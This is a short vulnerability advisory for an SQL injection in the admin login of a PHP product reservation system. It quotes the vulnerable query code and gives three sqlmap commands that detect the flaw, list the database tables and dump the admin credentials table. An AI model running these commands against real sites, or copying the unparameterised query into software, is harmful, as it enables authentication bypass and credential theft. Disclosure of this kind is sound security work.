# SQL Injection Vulnerability in Online Product Reservation System 1.0

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Vulnerable File**: handgunner-administrator/adminlogin.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the administrator login functionality. The application directly concatenates user input into SQL queries without any validation or parameterization, allowing attackers to bypass authentication completely.

### Analyse

**Vulnerability: SQL Injection**

```php
$email = $_POST['emailadd'];
$pass = $_POST['pass'];

$login = mysql_query("SELECT * FROM admin_login WHERE user_name = '$email' AND user_pass = '$pass'");
```

**Vulnerability Analysis**:

1. **No Input Sanitization**: User input directly concatenated into SQL query
2. **No Prepared Statements**: Uses deprecated `mysql_query()` function
3. **Plaintext Password Storage**: Passwords stored in plaintext in database
4. **Direct SQL Concatenation**: Both username and password vulnerable to SQLi

### POC

**Step 1: Detect SQL Injection**

```bash
sqlmap -u "http://target.com/handgunner-administrator/adminlogin.php" \
  --data="emailadd=test&pass=test" \
  --batch \
  --level=3 \
  --risk=2 \
  --dbs
```

[![pZUh0oT.png](https://s41.ax1x.com/2026/01/03/pZUh0oT.png)](https://imgchr.com/i/pZUh0oT)

**Step 2: Extract Database Tables**

```bash
sqlmap -u "http://target.com/handgunner-administrator/adminlogin.php" \
  --data="emailadd=test&pass=test" \
  --batch \
  -D cj_handgunner \
  --tables
```

[![pZUhgyR.png](https://s41.ax1x.com/2026/01/03/pZUhgyR.png)](https://imgchr.com/i/pZUhgyR)

**Step 3: Dump Admin Credentials**

```bash
sqlmap -u "http://target.com/handgunner-administrator/adminlogin.php" \
  --data="emailadd=test&pass=test" \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump
```

[![pZUhIYD.png](https://s41.ax1x.com/2026/01/03/pZUhIYD.png)](https://imgchr.com/i/pZUhIYD)

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
